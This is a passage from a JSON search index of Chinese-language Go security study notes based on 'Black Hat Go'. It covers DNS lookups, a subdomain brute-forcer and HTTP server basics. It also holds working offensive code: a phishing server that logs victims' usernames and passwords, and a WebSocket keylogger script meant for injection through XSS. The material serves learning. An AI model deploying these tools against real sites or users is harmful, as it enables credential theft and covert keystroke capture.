fqdns , err } if len ( in . Answer ) < 1 { return fqdns , errors . New ( \"No answer\" ) } for _ , answer := range in . Answer { if c , ok := answer .( * dns . CNAME ); ok { fqdns = append ( fqdns , c . Target ) } } return fqdns , nil } // func Lookup ( fqdn , serverAddr string ) [] Result { var results [] Result var cfqdn = fqdn for { cnames , err := LookupCNAME ( cfqdn , serverAddr ) if err == nil && len ( cnames ) > 0 { cfqdn = cnames [ 0 ] continue } ips , err := LookupA ( cfqdn , serverAddr ) if err != nil { break } for _ , ip := range ips { results = append ( results , Result { IpAddress : ip , Hostname : fqdn , }) } break } return results } func worker ( fqdn string , serverAddr string , resultChannel chan [] Result , swg * sizedwaitgroup . SizedWaitGroup ) { results := Lookup ( fqdn , serverAddr ) if len ( results ) > 0 { resultChannel <- results } return } func main () { var ( flDomain = flag . String ( \"domain\" , \"\" , \"The domain to perform fuzzing against.\" ) flWordlist = flag . String ( \"wordlist\" , \"\" , \"The wordlist to use for fuzzing\" ) flWorkerCount = flag . Int ( \"c\" , 100 , \"The amount of worker to use\" ) flServerAddr = flag . String ( \"server\" , \"8.8.8.8:53\" , \"The DNS server to use\" ) ) flag . Parse () if * flDomain == \"\" || * flWordlist == \"\" { fmt . Println ( \"domain and wordlist are rquired\" ) os . Exit ( 1 ) } swg := sizedwaitgroup . New ( * flWorkerCount ) resultsChannel := make ( chan [] Result ) var results [] Result go func () { // ? read from channel immediately for r := range resultsChannel { for _ , result := range r { fmt . Printf ( \"%s\\t%s\\n\" , result . Hostname , result . IpAddress ) } results = append ( results , r ... ) swg . Done () } }() fh , err := os . Open ( * flWordlist ) if err != nil { fmt . Println ( \"Cannot read \" + * flWordlist ) os . Exit ( 2 ) } defer fh . Close () reader := bufio . NewReader ( fh ) for { bytes , _ , err := reader . ReadLine () line := string ( bytes [:]) if err != nil { break } swg . Add () go worker ( fmt . Sprintf ( \"%s.%s\" , line , * flDomain ), * flServerAddr , resultsChannel , & swg ) } swg . Wait () close ( resultsChannel ) fmt . Println ( \"\\nResult:\\n-----------------------------------------------\" ) for _ , r := range results { fmt . Printf ( \"%s\\t%s\\n\" , r . Hostname , r . IpAddress ) } }","title":"\u7b2c\u4e94\u7ae0-DNS"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%BA%94%E7%AB%A0-DNS/#\u7b2c\u4e94\u7ae0-dns","text":"\u4e3b\u8981\u5b66\u4e60 dns \u8fd9\u4e2a\u7b2c\u4e09\u5305\u7684\u4f7f\u7528","title":"\u7b2c\u4e94\u7ae0-DNS"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%BA%94%E7%AB%A0-DNS/#fqdn","text":"\u4e00\u4e2a\u7b80\u5355\u7684dns\u7684 fully qualified domain name (fqdn)\u8bf7\u6c42,\u4f7f\u7528A\u8bb0\u5f55,\u5e76\u8f93\u51fa\u7ed3\u679c package main import ( \"fmt\" \"github.com/miekg/dns\" ) func main () { var msg dns . Msg fqdn := dns . Fqdn ( \"stacktitan.com\" ) msg . SetQuestion ( fqdn , dns . TypeA ) in , err := dns . Exchange ( & msg , \"8.8.8.8:53\" ) if err != nil { panic ( err ) } if len ( in . Answer ) < 1 { fmt . Println ( \"No records\" ) return } for _ , answer := range in . Answer { if a , ok := answer .( * dns . A ); ok { fmt . Println ( a . A ) } } } \u7b80\u5355\u5730\u5206\u6790\u4e00\u4e0b, in \u8fd9\u4e2a\u53d8\u91cf\u7c7b\u578b\u662fdns.Msg,\u800cMsg\u7684\u7ed3\u6784\u5982\u4e0b type Msg struct { MsgHdr Compress bool `json:\"-\"` // If true, the message will be compressed... u Question [] Question // Holds the RR(s) of the question section. v Answer [] RR // Holds the RR(s) of the answer section. Ns [] RR // Holds the RR(s) of the authority section. Extra [] RR // Holds the RR(s) of the additional section. } \u800cRR\u5219\u662f\u4e00\u4e2a\u63a5\u53e3,\u9700\u8981\u5b9e\u73b0\u4ee5\u4e0b\u51e0\u4e2a\u65b9\u6cd5 type RR interface { // Header returns the header of an resource record. The header contains // everything up to the rdata. Header () * RR_Header // String returns the text representation of the resource record. String () string // copy returns a copy of the RR copy () RR // len returns the length (in octets) of the compressed or uncompressed RR in wire format. // // If compression is nil, the uncompressed size will be returned, otherwise the compressed // size will be returned and domain names will be added to the map for future compression. len ( off int , compression map [ string ] struct {}) int // pack packs the records RDATA into wire format. The header will // already have been packed into msg. pack ( msg [] byte , off int , compression compressionMap , compress bool ) ( off1 int , err error ) // unpack unpacks an RR from wire format. // // This will only be called on a new and empty RR type with only the header populated. It // will only be called if the record's RDATA is non-empty. unpack ( msg [] byte , off int ) ( off1 int , err error ) // parse parses an RR from zone file format. // // This will only be called on a new and empty RR type with only the header populated. parse ( c * zlexer , origin string ) * ParseError // isDuplicate returns whether the two RRs are duplicates. isDuplicate ( r2 RR ) bool } \u6700\u540e\u904d\u5386answer(\u53d8\u91cf\u7c7b\u578b\u662fRR),\u8fd9\u91cc\u6709\u4e00\u4e2a\u5f3a\u5236\u8f6c\u6362 a, ok := answer.(*dns.A); ok ,\u5c06RR\u7c7b\u578b\u5f3a\u5236\u8f6c\u6362\u4e3a*dns.A,\u800cdns.A\u7684\u76f8\u5173\u7ed3\u6784\u53c8\u5982\u4e0b,\u53ef\u4ee5\u770b\u5230dns.A\u7ec4\u5408\u4e86RR Header\u8fd9\u4e2a\u7c7b\u578b,\u800cRR Header\u5b9e\u73b0\u4e86RR\u7684\u65b9\u6cd5,\u56e0\u6b64dns.A\u53ef\u4ee5\u662fRR\u7c7b\u578b // A RR. See RFC 1035. type A struct { Hdr RR_Header A net . IP `dns:\"a\"` } // RR_Header is the header all DNS resource records share. type RR_Header struct { Name string `dns:\"cdomain-name\"` Rrtype uint16 Class uint16 Ttl uint32 Rdlength uint16 // Length of data after header. } // Header returns itself. This is here to make RR_Header implements the RR interface. func ( h * RR_Header ) Header () * RR_Header { return h } // Just to implement the RR interface. func ( h * RR_Header ) copy () RR { return nil } // ...","title":"FQDN"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%BA%94%E7%AB%A0-DNS/#subdomain_fuzzer","text":"\u53c2\u8003blackhat-go\u91ccsubdomain_guesser\u5199\u7684,\u4e00\u4e2a\u7b80\u5355\u7684\u6839\u636e\u5b57\u5178\u901a\u8fc7dns\u67e5\u8be2\u7206\u7834\u5b50\u57df\u540d\u7684\u5de5\u5177,\u6838\u5fc3\u57fa\u672c\u4e00\u6837,\u4f46\u662f\u7531\u4e8e\u539f\u4f5c\u8005\u5199\u7684\u534f\u7a0b\u5e76\u53d1\u4ee3\u7801\u6709\u70b9\u96be\u4ee5\u7406\u89e3,\u6240\u4ee5\u7a0d\u5fae\u4fee\u6539\u4e86\u4e00\u4e0b,\u4f7f\u7528\u4e86 sizedwaitgroup \u8fd9\u4e2a\u5305 package main import ( \"bufio\" \"errors\" \"flag\" \"fmt\" \"os\" \"github.com/miekg/dns\" \"github.com/remeh/sizedwaitgroup\" ) // type Result struct { IpAddress string Hostname string } // func LookupA ( fqdn , serverAddr string ) ([] string , error ) { var m dns . Msg var ips [] string m . SetQuestion ( dns . Fqdn ( fqdn ), dns . TypeA ) in , err := dns . Exchange ( & m , serverAddr ) if err != nil { return ips , err } if len ( in . Answer ) < 1 { return ips , errors . New ( \"No answer\" ) } for _ , answer := range in . Answer { if a , ok := answer .( * dns . A ); ok { ips = append ( ips , a . A . String ()) } } return ips , nil } func LookupCNAME ( fqdn , serverAddr string ) ([] string , error ) { var m dns . Msg var fqdns [] string m . SetQuestion ( dns . Fqdn ( fqdn ), dns . TypeCNAME ) in , err := dns . Exchange ( & m , serverAddr ) if err != nil { return fqdns , err } if len ( in . Answer ) < 1 { return fqdns , errors . New ( \"No answer\" ) } for _ , answer := range in . Answer { if c , ok := answer .( * dns . CNAME ); ok { fqdns = append ( fqdns , c . Target ) } } return fqdns , nil } // func Lookup ( fqdn , serverAddr string ) [] Result { var results [] Result var cfqdn = fqdn for { cnames , err := LookupCNAME ( cfqdn , serverAddr ) if err == nil && len ( cnames ) > 0 { cfqdn = cnames [ 0 ] continue } ips , err := LookupA ( cfqdn , serverAddr ) if err != nil { break } for _ , ip := range ips { results = append ( results , Result { IpAddress : ip , Hostname : fqdn , }) } break } return results } func worker ( fqdn string , serverAddr string , resultChannel chan [] Result , swg * sizedwaitgroup . SizedWaitGroup ) { results := Lookup ( fqdn , serverAddr ) if len ( results ) > 0 { resultChannel <- results } return } func main () { var ( flDomain = flag . String ( \"domain\" , \"\" , \"The domain to perform fuzzing against.\" ) flWordlist = flag . String ( \"wordlist\" , \"\" , \"The wordlist to use for fuzzing\" ) flWorkerCount = flag . Int ( \"c\" , 100 , \"The amount of worker to use\" ) flServerAddr = flag . String ( \"server\" , \"8.8.8.8:53\" , \"The DNS server to use\" ) ) flag . Parse () if * flDomain == \"\" || * flWordlist == \"\" { fmt . Println ( \"domain and wordlist are rquired\" ) os . Exit ( 1 ) } swg := sizedwaitgroup . New ( * flWorkerCount ) resultsChannel := make ( chan [] Result ) var results [] Result go func () { // ? read from channel immediately for r := range resultsChannel { for _ , result := range r { fmt . Printf ( \"%s\\t%s\\n\" , result . Hostname , result . IpAddress ) } results = append ( results , r ... ) swg . Done () } }() fh , err := os . Open ( * flWordlist ) if err != nil { fmt . Println ( \"Cannot read \" + * flWordlist ) os . Exit ( 2 ) } defer fh . Close () reader := bufio . NewReader ( fh ) for { bytes , _ , err := reader . ReadLine () line := string ( bytes [:]) if err != nil { break } swg . Add () go worker ( fmt . Sprintf ( \"%s.%s\" , line , * flDomain ), * flServerAddr , resultsChannel , & swg ) } swg . Wait () close ( resultsChannel ) fmt . Println ( \"\\nResult:\\n-----------------------------------------------\" ) for _ , r := range results { fmt . Printf ( \"%s\\t%s\\n\" , r . Hostname , r . IpAddress ) } }","title":"subdomain_fuzzer"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E5%9B%9B%E7%AB%A0-HTTP%E6%9C%8D%E5%8A%A1%E5%99%A8/","text":"\u7b2c\u56db\u7ae0-HTTP\u670d\u52a1\u5668 # \u4e00\u4e2a\u7b80\u5355\u7684http\u670d\u52a1\u5668 # package main import ( \"fmt\" \"net/http\" ) func hello ( w http . ResponseWriter , r * http . Request ) { name := r . URL . Query (). Get ( \"name\" ) fmt . Fprintf ( w , \"Hello, %s\\n\" , name ) } func main () { http . HandleFunc ( \"/hello\" , hello ) http . ListenAndServe ( \":8000\" , nil ) } \u4f7f\u7528\u52a8\u6001\u8def\u7531\u7684\u670d\u52a1\u5668 # package main import ( \"fmt\" \"net/http\" \"strings\" ) type router struct { } func ( r * router ) ServeHTTP ( w http . ResponseWriter , req * http . Request ) { urlpath := req . URL . Path if strings . HasPrefix ( urlpath , \"/a\" ) { fmt . Fprint ( w , \"hello a\" ) } else if strings . HasPrefix ( urlpath , \"/b\" ) { fmt . Fprint ( w , \"hello b\" ) } else if strings . HasPrefix ( urlpath , \"/c\" ) { fmt . Fprint ( w , \"hello c\" ) } else { http . Error ( w , \"404 not found\" , 404 ) } } func main () { http . ListenAndServe ( \":8000\" , & router {}) } \u4e00\u4e2a\u7b80\u5355\u7684\u4e2d\u95f4\u4ef6 # package main import ( \"fmt\" \"log\" \"net/http\" ) type logger struct { Inner http . Handler } func ( l * logger ) ServeHTTP ( w http . ResponseWriter , r * http . Request ) { log . Print ( \"start\" ) l . Inner . ServeHTTP ( w , r ) log . Print ( \"end\" ) } func hello ( w http . ResponseWriter , r * http . Request ) { fmt . Fprint ( w , \"hello\\n\" ) } func main () { f := http . HandlerFunc ( hello ) http . ListenAndServe ( \":8000\" , & logger { Inner : f }) } \u8fd9\u91cc\u5b9e\u73b0\u4e86\u4e00\u79cd\u7c7b\u4f3c\u4e8e\u88c5\u9970\u5668\u7684\u601d\u60f3. \u9996\u5148http.HandlerFunc\u7684\u5b9a\u4e49\u548c\u65b9\u6cd5\u5982\u4e0b,\u53ef\u4ee5\u770b\u5230HandlerFunc\u5373 func(ResponseWriter, *Request) \u7684\u522b\u540d,\u5f53\u8c03\u7528ServeHTTP\u51fd\u6570\u7684\u65f6\u5019\u4f1a\u56de\u8c03\u8c03\u7528\u8be5\u51fd\u6570\u672c\u8eab,\u4ece\u800c\u8c03\u7528\u6211\u4eec\u4f8b\u5b50\u4e2d\u7684hello\u51fd\u6570 // The HandlerFunc type is an adapter to allow the use of // ordinary functions as HTTP handlers. If f is a function // with the appropriate signature, HandlerFunc(f) is a // Handler that calls f. type HandlerFunc func ( ResponseWriter , * Request ) // ServeHTTP calls f(w, r). func ( f HandlerFunc ) ServeHTTP ( w ResponseWriter , r * Request ) { f ( w , r ) } \u7136\u540e\u6211\u4eec\u5b9a\u4e49\u4e86\u4e00\u4e2a\u81ea\u5df1\u7684\u7ed3\u6784\u4f53logger,\u5305\u542b\u4e86\u4e00\u4e2aInner\u5c5e\u6027,\u7c7b\u578b\u4e3ahttp.Handler,\u800chttp.Handler\u7684\u5b9a\u4e49\u5982\u4e0b type Handler interface { ServeHTTP ( ResponseWriter , * Request ) } \u53ef\u4ee5\u770b\u5230\u662f\u4e00\u4e2a\u63a5\u53e3,\u53ea\u9700\u8981\u5b9e\u73b0\u4e86ServeHTTP\u8fd9\u4e2a\u65b9\u6cd5\u5373\u53ef,\u90a3\u4e48\u6211\u4eec\u7684HandlerFunc\u5c31\u80fd\u5145\u5f53Handler \u6700\u540e\u6211\u4eec\u5b9a\u4e49\u4e86logger\u7684ServeHTTP,\u6267\u884c\u67d0\u4e9b\u8bed\u53e5,\u56de\u8c03hello\u8fd9\u4e2a\u51fd\u6570\u7684ServeHTTP,\u6700\u540e\u518d\u6267\u884c\u67d0\u4e9b\u8bed\u53e5,\u5b9e\u73b0\u4e86\u7c7b\u4f3c\u4e8e\u88c5\u9970\u5668\u7684\u7ed3\u6784 \u8c03\u7528\u94fe\u4e3a: ListenAndServe\u4f7f\u7528logger\u4f5c\u4e3a\u8def\u7531->logger.ServeHTTP->hello.ServeHTTP->hello \u7b2c\u4e09\u65b9\u5305:alice # Alice\u63d0\u4f9b\u4e86\u4e00\u79cd\u4fbf\u6377\u7684\u65b9\u5f0f\u6765\u94fe\u63a5\u60a8\u7684HTTP\u4e2d\u95f4\u4ef6\u529f\u80fd\u548c\u5e94\u7528\u7a0b\u5e8f\u5904\u7406\u7a0b\u5e8f\u3002 \u5982\u679c\u4f7f\u7528Alice\u6765\u6539\u5199\u4e0a\u9762\u7684\u4e2d\u95f4\u4ef6\u7684\u8bdd,\u4ee3\u7801\u4f1a\u53d8\u6210 package main import ( \"fmt\" \"log\" \"net/http\" \"time\" \"github.com/justinas/alice\" ) func logHandler ( h http . Handler ) http . Handler { return http . HandlerFunc ( func ( w http . ResponseWriter , r * http . Request ) { log . Print ( \"start\" ) h . ServeHTTP ( w , r ) log . Print ( \"end\" ) }) } func timeoutHandler ( h http . Handler ) http . Handler { return http . TimeoutHandler ( h , 1 * time . Second , \"timed out\" ) } func hello ( w http . ResponseWriter , r * http . Request ) { fmt . Fprint ( w , \"hello\\n\" ) } func main () { middleWare := alice . New ( logHandler , timeoutHandler ) http . ListenAndServe ( \":8000\" , middleWare . Then ( http . HandlerFunc ( hello ))) } \u53ef\u4ee5\u770b\u5230alice\u5305\u7684\u4f5c\u7528\u5f88\u7b80\u5355,\u5e2e\u52a9\u6211\u4eec\u62fc\u63a5\u4e2d\u95f4\u4ef6,\u5728\u7ecf\u8fc7\u4e2d\u95f4\u4ef6\u8fc7\u540e\u518d\u6267\u884c\u6211\u4eec\u7684Handler \u7b2c\u4e09\u65b9\u5305:mux # \u7ed3\u5408\u4e86alice\u548cmux\u7684\u4e00\u4e2a\u7b80\u5355\u6d4b\u8bd5\u670d\u52a1\u5668\u5982\u4e0b package main import ( \"fmt\" \"log\" \"net/http\" \"time\" \"github.com/gorilla/mux\" \"github.com/justinas/alice\" ) func logHandler ( h http . Handler ) http . Handler { return http . HandlerFunc ( func ( w http . ResponseWriter , r * http . Request ) { log . Print ( \"start\" ) h . ServeHTTP ( w , r ) log . Print ( \"end\" ) }) } func timeoutHandler ( h http . Handler ) http . Handler { return http . TimeoutHandler ( h , 1 * time . Second , \"timed out\" ) } func hello ( w http . ResponseWriter , r * http . Request ) { value , ok := mux . Vars ( r )[ \"value\" ] w . WriteHeader ( http . StatusOK ) if ok { r . ParseForm () key := r . Form . Get ( \"key\" ) fmt . Fprintf ( w , \"key is %s, value is %s\\n\" , key , value ) } else { fmt . Fprintf ( w , \"hello\" ) } } func main () { middleWare := alice . New ( logHandler , timeoutHandler ) r := mux . NewRouter () s := r . PathPrefix ( \"/hello\" ). Subrouter () s . HandleFunc ( \"\" , hello ). Methods ( \"GET\" ) s . HandleFunc ( \"/\" , hello ). Methods ( \"GET\" ) s . HandleFunc ( \"/{value}\" , hello ). Methods ( \"POST\" ) http . ListenAndServe ( \":8000\" , middleWare . Then ( r )) } \u7b2c\u4e09\u65b9\u5305: Martini # Martini\u66f4\u50cf\u662f\u96c6\u6210\u4e86\u524d\u9762\u6240\u6709\u7684\u5305\u7684\u7b2c\u4e09\u65b9\u5305,\u4e0d\u4f7f\u7528\u539f\u751f\u7684net/http\u5305 \u5177\u4f53\u4f7f\u7528\u67e5\u770b \u8fd9\u91cc ,\u503c\u5f97\u4e00\u63d0\u7684\u662f\u53ef\u4ee5\u5728 \u8fd9\u91cc \u627e\u5230\u8fd9\u4e2a\u7b2c\u4e09\u65b9\u5305\u7684\u4e2d\u95f4\u4ef6 HTML\u6a21\u677f # golang\u4e2d\u81ea\u5e26\u6709html\u6a21\u677f\u7684\u5305: html/template ,\u4e00\u4e2a\u7b80\u5355\u7684\u4f7f\u7528\u5982\u4e0b package main import ( \"html/template\" \"net/http\" \"github.com/go-martini/martini\" ) type TemplateData struct { UserName string Password string } var x = `<html> <body> Hello {{.UserName}}. Your password is {{.Password}}. </body> </html>` func main () { m := martini . Classic () m . Get ( \"/\" , func () string { return \"Hello world!\" }) m . Get ( \"/hello/:UserName/:Password\" , func ( params martini . Params , w http . ResponseWriter ) { t , err := template . New ( \"hello\" ). Parse ( x ) if err != nil { w . WriteHeader ( 500 ) } td := TemplateData { UserName : params [ \"UserName\" ], Password : params [ \"Password\" ]} t . Execute ( w , td ) }) m . RunOnAddr ( \":8000\" ) } Credential Harvesting Attack(\u51ed\u8bc1\u6536\u96c6\u653b\u51fb) # \u5b9e\u9645\u4e0a\u5c31\u662f\u9493\u9c7c,\u6838\u5fc3\u601d\u60f3\u662f\u521b\u5efa\u514b\u9686\u7f51\u7ad9,\u6b3a\u9a97\u7528\u6237\u8f93\u5165\u5b83\u7684\u51ed\u8bc1\u5e76\u8bb0\u5f55 blackhat-go\u91cc\u7ed9\u4e86\u4e00\u4e2a \u793a\u4f8b \u8fd9\u91cc\u9700\u8981\u5c06\u4e0b\u8f7d\u4e0b\u6765\u7684public/index.html\u4e2d\u7684\u8868\u5355action\u6539\u4e3a\"/login\" \u7136\u540e\u4f7f\u7528golang\u6784\u5efa\u4e00\u4e2a\u7b80\u5355\u7684http\u670d\u52a1\u5668\u7528\u4e8e\u7a83\u53d6\u51ed\u8bc1 package main import ( \"net/http\" \"os\" \"time\" \"github.com/gorilla/mux\" log \"github.com/sirupsen/logrus\" ) func login ( w http . ResponseWriter , r * http . Request ) { log . WithFields ( log . Fields { \"time\" : time . Now (). String (), \"username\" : r . FormValue ( \"_user\" ), \"password\" : r . FormValue ( \"_pass\" ), \"user-agent\" : r . UserAgent (), \"ip_address\" : r . RemoteAddr , }). Info ( \"login attempt\" ) http . Redirect ( w , r , \"/\" , 302 ) } func main () { fh , err := os . OpenFile ( \"credentials.txt\" , os . O_CREATE | os . O_APPEND | os . O_WRONLY , 0600 ) if err != nil { panic ( err ) } defer fh . Close () log . SetOutput ( fh ) r := mux . NewRouter () r . HandleFunc ( \"/login\" , login ). Methods ( \"POST\" ) r . PathPrefix ( \"/\" ). Handler ( http . FileServer ( http . Dir ( \"./public\" ))) log . Fatal ( http . ListenAndServe ( \":8080\" , r )) } \u8fd9\u91cc\u7528\u5230\u4e86http.FileServer\u548chttp.Dir,\u914d\u5408gorilla/mux,\u5c06public\u76ee\u5f55\u8bbe\u7f6e\u6210\u4e86web\u6839\u76ee\u5f55,\u51fd\u6570login\u7684\u4f5c\u7528\u5c31\u662f\u5c06\u7528\u6237post\u7684\u5185\u5bb9\u8bb0\u5f55\u5728\u65e5\u5fd7\u4e2d Keylogging With Websocket(\u4f7f\u7528Websocket\u7684\u952e\u76d8\u8bb0\u5f55\u5668) # \u653b\u51fb\u573a\u666f\u662f\u81ea\u5df1\u67b6\u8bbe\u4e86\u4e00\u4e2a\u670d\u52a1\u5668\u6216\u8005\u67d0\u4e2a\u670d\u52a1\u5668\u4e0a\u5b58\u5728XSS\u6f0f\u6d1e,\u8fd9\u65f6\u53ef\u4ee5\u901a\u8fc7\u63d2\u5165\u67d0\u6bb5\u6076\u610fJS\u4ee3\u7801,\u901a\u8fc7Websocket\u5c06\u7528\u6237\u7684\u4efb\u4f55\u8f93\u5165\u53d1\u9001\u56de\u653b\u51fb\u8005\u7684\u670d\u52a1\u5668 \u9996\u5148\u9700\u8981\u4e00\u4e2a\u6d4b\u8bd5\u73af\u5883,blackhat-go\u63a8\u8350\u4f7f\u7528 JSBIN \u4e00\u6bb5\u6d4b\u8bd5\u7528\u7684HTML\u4ee3\u7801 <!DOCTYPE html> < html > < head > < title > Login </ title > </ head > < body > < script src = 'http://localhost:8080/logger.js' ></ script > < form action = '/login' method = 'post' > < input name = 'username' /> < input name = 'password' /> < input type = \"submit\" /> </ form > </ body > </ html > \u4e00\u6bb5\u7b80\u5355\u7684\u5efa\u7acbwebsocket\u7684logger.js (Go\u6a21\u677f) ( function () { var conn = new WebSocket ( \"ws://{{.}}/ws\" ); document . onkeypress = keypress ; function keypress ( evt ) { s = String . fromCharCode ( evt . which ); conn . send ( s ); } })(); \u7136\u540e\u4e00\u4e2a\u7528\u4e8e\u63d0\u4f9blogger.js\u548c\u5904\u7406websocket\u7684\u670d\u52a1\u5668,\u8fd9\u91cc\u7528\u5230\u4e86 websocket \u7b2c\u4e09\u65b9\u5305 package main import ( \"flag\" \"fmt\" \"html/template\" \"log\" \"net/http\" \"github.com/gorilla/mux\" \"github.com/gorilla/websocket\" ) var ( upgrader = websocket . Upgrader { CheckOrigin : func ( r * http . Request ) bool { return true }, } listenAddr string wsAddr string jsTemplate * template . Template ) func init () { flag . StringVar ( & listenAddr , \"listen\" , \"\" , \"Address to listen on\" ) flag . StringVar ( & wsAddr , \"ws\" , \"\" , \"Address for WebSocket connection\" ) flag . Parse () var err error jsTemplate , err = template . ParseFiles ( \"logger.js\" ) if err != nil { panic ( err ) } } func serveWS ( w http . ResponseWriter , r * http . Request ) { conn , err := upgrader . Upgrade ( w , r , nil ) if err != nil { http . Error ( w , \"\" , 500 ) return } defer conn . Close () fmt . Printf ( \"Connection from %s\\n\" , conn . RemoteAddr (). String ()) for { _ , msg , err := conn . ReadMessage () if err != nil { return } fmt . Printf ( \"From %s: %s\\n\" , conn . RemoteAddr (). String (), string ( msg )) } } func serveLogger ( w http . ResponseWriter , r * http . Request ) { w . Header (). Set ( \"Content-Type\" , \"application/javascript\" ) jsTemplate . Execute ( w , wsAddr ) } func main () { r := mux . NewRouter () r . HandleFunc ( \"/ws\" , serveWS ) r . HandleFunc ( \"/logger.js\" , serveLogger ) fmt . Println ( \"test\" , wsAddr ) log . Fatal ( http . ListenAndServe ( \":8080\" , r )) } websocket\u8fd8\u662f\u5f88\u597d\u73a9\u7684,\u5b9e\u9645\u6548\u679c\u5982\u4e0b \u8f6c\u79fb\u7b14\u8bb0\u7684\u65f6\u5019\u56fe\u5f04\u4e22\u4e86\uff0c\u5404\u4f4d\u5e08\u5085\u4eec\u8bf7\u81ea\u5df1\u624b\u52a8\u6d4b\u8bd5\u4e0b\u4ee3\u7801\u5427 Reverse Proxy(\u53cd\u5411\u4ee3\u7406) # golang\u81ea\u5e26\u7684httputil\u5305\u4e2d\u5b58\u5728ReverseProxy\u7684\u5b9e\u73b0,\u4e00\u4e2a\u7b80\u5355\u7684\u53cd\u5411\u4ee3\u7406\u5982\u4e0b package main import ( \"log\" \"net/http\" \"net/http/httputil\" \"net/url\" ) func main () { // \u5c06 http://127.0.0.1:8888/ \u53cd\u5411\u4ee3\u7406\u5230 http://127.0.0.1:80/ targetUrlString := \"http://127.0.0.1:80/\" targetUrl , err := url . Parse ( targetUrlString ) if err != nil { log . Fatal ( \"err\" ) } proxy := httputil . NewSingleHostReverseProxy ( targetUrl ) log . Println ( \"Reverse proxy server at 127.0.0.1:8888\" ) if err := http . ListenAndServe ( \":8888\" , proxy ); err != nil { log . Fatalln ( \"Error:\" , err ) } } \u7b80\u5355\u7684RPC\u670d\u52a1\u5668 # \u53c2\u8003\u6587\u7ae0: Go\u5b98\u65b9\u5e93RPC\u5f00\u53d1\u6307\u5357 \u4f7f\u7528golang\u4e2d\u81ea\u5e26\u7684 net/rpc \u5305\u7f16\u5199\u4e00\u4e2a\u7b80\u5355\u7684rpc\u670d\u52a1\u5668(\u53ef\u4ee5\u7528\u4e8e\u5b9e\u73b0\u7c7b\u4f3c\u52a8\u6001\u5bfc\u5165\u7684\u529f\u80fd) \u9996\u5148\u5b9a\u4e49\u4e00\u4e2a rpc_client.go package rpc_server import ( \"errors\" \"log\" \"net\" \"net/http\" \"net/rpc\" ) type Args struct { // \u4f20\u5165\u53c2\u6570\u7ed3\u6784 A , B int } // \u8fd4\u56de\u53c2\u6570\u7ed3\u6784 type Quotient struct { Quo , Rem int } // rpc\u670d\u52a1\u5668\u8981\u5b9e\u73b0\u7684\u63a5\u53e3 type ServiceInterface interface { Multiply ( args * Args , reply * int ) error Divide ( args * Args , quo * Quotient ) error } // \u7a7a\u7684\u7ed3\u6784,\u7528\u4e8e\u5b9e\u73b0rpc\u670d\u52a1\u5668\u63a5\u53e3 type Service struct { } // \u5b9e\u73b0Multiply\u65b9\u6cd5 func ( ss * Service ) Multiply ( args * Args , reply * int ) error { * reply = args . A * args . B return nil } // \u5b9e\u73b0Divide\u65b9\u6cd5 func ( ss * Service ) Divide ( args * Args , quo * Quotient ) error { if args . B == 0 { return errors . New ( \"Divide by zero\" ) } quo . Quo = args . A / args . B quo . Rem = args . A % args . B return nil } // \u5f00\u59cb\u76d1\u542c\u7aef\u53e3,\u5904\u7406\u8fde\u63a5 func Start () { s := new ( Service ) rpc . Register ( s ) rpc . HandleHTTP () l , e := net . Listen ( \"tcp\" , \":8888\" ) if e != nil { log . Fatal ( \"listen error:\" , e ) } go http . Serve ( l , nil ) } \u7136\u540e\u7f16\u5199 rpc_client.go package rpc_client import ( \"fmt\" \"learn/rpc_server\" \"log\" \"net/rpc\" ) const ServiceName = \"Service\" // \u8fde\u63a5\u5230rpc\u670d\u52a1\u5668\u5e76\u4e14\u8fdc\u7a0b\u8c03\u7528Multiply\u65b9\u6cd5 func Connect ( address string ) { client , err := rpc . DialHTTP ( \"tcp\" , address ) if err != nil { log . Fatal ( \"Dial error:\" , err ) } args := & rpc_server . Args { A : 7 , B : 8 } var reply int err = client . Call ( ServiceName + \".Multiply\" , args , & reply ) if err != nil { log . Fatal ( \"Error:\" , err ) } fmt . Printf ( \"Multiply: %d*%d=%d\" , args . A , args . B , reply ) } \u6700\u540e\u7f16\u5199\u4e00\u4e2amain.go\u505a\u6d4b\u8bd5 package main import ( \"learn/rpc_client\" \"learn/rpc_server\" \"time\" ) func main () { rpc_server . Start () time . Sleep ( 1 * time . Second ) rpc_client . Connect ( \"127.0.0.1:8888\" ) } \u5b9e\u73b0\u6548\u679c\u5982\u4e0b \u8f6c\u79fb\u7b14\u8bb0\u7684\u65f6\u5019\u56fe\u5f04\u4e22\u4e86\uff0c\u5404\u4f4d\u5e08\u5085\u4eec\u8bf7\u81ea\u5df1\u624b\u52a8\u6d4b\u8bd5\u4e0b\u4ee3\u7801\u5427 \u7136\u800cgolang\u4e2d\u81ea\u5e26\u7684net/rpc\u5305\u5b58\u5728\u67d0\u4e9b\u7f3a\u70b9,\u5982: (\u53c2\u8003\u6587\u7ae0: Golang\u6807\u51c6\u5e93RPC\u5b9e\u8df5\u53ca\u6539\u8fdb ) \u5f53\u96c6\u7fa4\u673a\u5668\u589e\u52a0\u5230\u4e00\u5b9a\u6570\u91cf,\u8bf7\u6c42\u91cf\u53d8\u5927\u65f6,\u4f1a\u51fa\u73b0\u5f88\u591a\u4efb\u52a1\u5361\u4f4f\u6ca1\u6709\u54cd\u5e94\u7684\u60c5\u51b5,\u53ef\u4ee5\u8f6c\u7528tcp\u5b9e\u73b0rpc\u670d\u52a1\u5668\u89e3\u51b3 rpc\u5305\u91cc\u7684rpc.Dial\u51fd\u6570\u6ca1\u6709timeout, \u7cfb\u7edf\u9ed8\u8ba4\u662f\u6ca1\u6709timeout\u7684,\u6240\u4ee5\u5728\u8fd9\u91cc\u53ef\u80fd\u5361\u4f4f.\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u91c7\u7528net\u5305\u91cc\u7684 net.DialTimeout\u51fd\u6570 rpc\u5305\u91cc\u9ed8\u8ba4\u4f7f\u7528gobCodec\u6765\u7f16\u7801\u89e3\u7801, \u8fd9\u91ccio\u53ef\u80fd\u4f1a\u5361\u4f4f\u800c\u4e0d\u8fd4\u56de\u9519\u8bef,\u6240\u4ee5\u6211\u4eec\u8981\u81ea\u5df1\u7f16\u5199\u52a0\u5165timeout\u7684codec. 